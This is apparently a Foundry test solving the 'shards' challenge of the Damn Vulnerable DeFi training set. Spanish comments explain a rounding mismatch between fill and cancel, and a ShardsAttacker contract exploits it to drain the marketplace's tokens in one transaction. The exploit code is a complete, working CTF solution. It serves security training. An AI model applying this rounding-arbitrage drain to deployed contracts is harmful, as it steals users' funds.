// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

/*
 * NEXUS Offensive · training/dvd · reto "shards"
 *
 * CLASE DE BUG: arbitraje de redondeo entre `fill` y `cancel`. Al comprar,
 *   el costo = want·price·rate / totalShards (redondea HACIA ABAJO). Al
 *   cancelar, el reembolso = want·rate / 1e6 (otra fórmula, redondea HACIA
 *   ARRIBA). El cociente reembolso/costo = totalShards/price ≈ 1e13, así que
 *   comprar y cancelar devuelve mucho más de lo pagado → free lunch.
 *
 * FAMILIA: Lógica de marketplace / redondeo direccional (relacionado con la
 *   familia Vault V3: el redondeo debe favorecer al protocolo, no al usuario).
 *
 * INVARIANTE QUE LO ATRAPA:
 *   Comprar y cancelar debe ser neutral: el reembolso nunca excede lo pagado.
 *   Se sostiene en teoría y se rompe: con ~0 de entrada se extraen ~7.4e20 DVT.
 */
contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableNFT nft;
    DamnValuableToken token;
    ShardsNFTMarketplace marketplace;
    ShardsFeeVault feeVault;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }
        token = new DamnValuableToken();
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);
        token.transfer(seller, SELLER_DVT_BALANCE);
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE);
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }
        initialTokensInMarketplace = token.balanceOf(address(marketplace));
        vm.stopPrank();
    }

    function test_shards() public checkSolvedByPlayer {
        // Una sola tx del player: desplegar el atacante (hace todo en el constructor).
        ShardsAttacker attacker = new ShardsAttacker(marketplace, token, 1, recovery);

        // INV rota: con ~0 de entrada se extrajo muchísimo (arbitraje de redondeo).
        console.log("pagado por el atacante (wei):", attacker.totalPaid());
        console.log("extraido a recovery (wei):   ", attacker.loot());
        assertGt(attacker.loot(), attacker.totalPaid() * 1000, "INV rota: reembolso >> pagado");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");
        assertEq(vm.getNonce(player), 1);
    }
}

/// @notice Atacante: bootstrap con un fill de costo 0 para sembrar DVT, luego un
///         fill grande + cancel que drena el marketplace por el redondeo. Todo
///         en el constructor = una sola tx del player.
contract ShardsAttacker {
    uint256 public totalPaid;
    uint256 public loot;

    constructor(ShardsNFTMarketplace m, DamnValuableToken t, uint64 offerId, address recovery) {
        t.approve(address(m), type(uint256).max);

        // 1) Bootstrap: fill de 133 shards → costo redondea a 0; cancel reembolsa.
        uint256 p1 = m.fill(offerId, 133);
        m.cancel(offerId, p1);

        // 2) Drenaje: fill grande (costo ~7.4e7, pagable con lo sembrado) y cancel
        //    reembolsa ~7.4e20 por el redondeo hacia arriba.
        uint256 want2 = 9_900_000_000;
        uint256 before = t.balanceOf(address(this));
        uint256 p2 = m.fill(offerId, want2);
        totalPaid = before - t.balanceOf(address(this)); // lo que costó el fill grande
        m.cancel(offerId, p2);

        loot = t.balanceOf(address(this));
        t.transfer(recovery, loot);
    }
}
